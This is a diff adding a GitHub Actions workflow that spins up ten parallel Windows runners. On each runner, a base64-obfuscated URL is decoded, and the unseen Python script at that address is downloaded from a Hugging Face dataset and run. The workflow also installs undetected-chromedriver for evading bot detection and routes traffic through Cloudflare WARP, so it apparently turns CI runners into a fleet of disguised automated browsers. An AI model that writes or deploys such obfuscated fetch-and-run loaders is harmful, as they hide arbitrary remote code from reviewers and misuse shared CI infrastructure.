@@ -1,0 +1,70 @@
+name: Parallel Worker Fleet
+
+on:
+  repository_dispatch:
+    types: [run-task]
+  workflow_dispatch:
+
+concurrency:
+  group: worker-cluster-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  deploy-agents:
+    name: "Agent-${{ matrix.agent_id }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        agent_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+
+    steps:
+      - name: Base Preparation & Artifact Fetch
+        shell: bash
+        run: |
+          echo "[PREP] Initializing node ${{ matrix.agent_id }}..."
+          
+          # سحب الملف الرئيسي من المصدر المشفر
+          SOURCE_PATH=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$SOURCE_PATH" -o app_task.py
+          
+          echo "[PREP] Installing required libraries..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[PREP] Bootstrap completed."
+
+      - name: Main Routine and Lifespan Controller
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output ">>> Activating worker for instance ${{ matrix.agent_id }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $ExecutionConfig = @{
+              FilePath     = "python"
+              ArgumentList = "app_task.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $RunningInstance = Start-Process @ExecutionConfig
+          
+          Write-Output ">>> Guardian activated. Max permitted runtime: 74 minutes."
+          
+          try {
+              Wait-Process -InputObject $RunningInstance -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Operation finalized successfully before deadline."
+          }
+          catch {
+              Write-Output ">>> Deadline breached! Forcibly terminating the instance..."
+              Stop-Process -InputObject $RunningInstance -Force
+              Write-Output ">>> Instance forcefully halted."
+          }
+
+      - name: Shutdown Acknowledgment
+        shell: bash
+        run: echo "[END] Agent ${{ matrix.agent_id }} has concluded processing."
